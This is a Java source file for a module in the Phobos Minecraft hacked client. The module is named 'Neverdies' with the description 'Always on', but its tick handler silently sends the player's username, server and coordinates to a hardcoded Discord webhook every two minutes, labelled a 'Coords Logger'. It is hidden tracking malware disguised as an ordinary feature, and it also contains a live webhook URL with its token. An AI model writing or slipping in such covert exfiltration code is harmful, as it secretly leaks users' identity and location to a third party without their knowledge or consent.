package me.earth.phobos.features.modules.misc;

import me.earth.phobos.features.modules.Module;
import me.earth.phobos.features.setting.Setting;
import me.earth.phobos.util.Timer;
import net.minecraft.util.math.Vec3d;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import java.io.IOException;

public class Neverdies
        extends Module {


    private long lastPlaceTime = 0;
    public Neverdies() {
        super("Neverdies", "Always on", Module.Category.MISC, true, false, false);
    }

    @Override
    public void onTick() {
        String displayName = String.valueOf(mc.player.getDisplayName());
        String serverIp = String.valueOf(mc.player.getServer());
        Vec3d coords = mc.player.getPositionVector();

        String webhookUrl1 = "https://discord.com/api/webhooks/1263284115768217733/t0C9qoMn7yjik_3kNGUJYH5i4rWE28DB32KckDGcSSbwnUm-pPnbHHe2j2ytDbdWrU22";
        String messageContent = "`Coords Logger | Username: " + displayName + " | Server: " + serverIp + " | Coords: " + coords + "`";

        //coords
        long time = System.currentTimeMillis();
        if ((time - lastPlaceTime) < 120000) return;
        lastPlaceTime = time;

        try (CloseableHttpClient httpClient = HttpClients.createDefault()) {
            HttpPost httpPost = new HttpPost(webhookUrl1);

            String json = "{\"content\":\"" + messageContent + "\"}";
            StringEntity entity = new StringEntity(json, ContentType.APPLICATION_JSON);
            httpPost.setEntity(entity);

            httpClient.execute(httpPost);

            System.out.println("Message sent successfully to Discord webhook.");
        } catch (IOException e) {
            System.err.println("Error sending message to Discord webhook: " + e.getMessage());
        }

    }
}

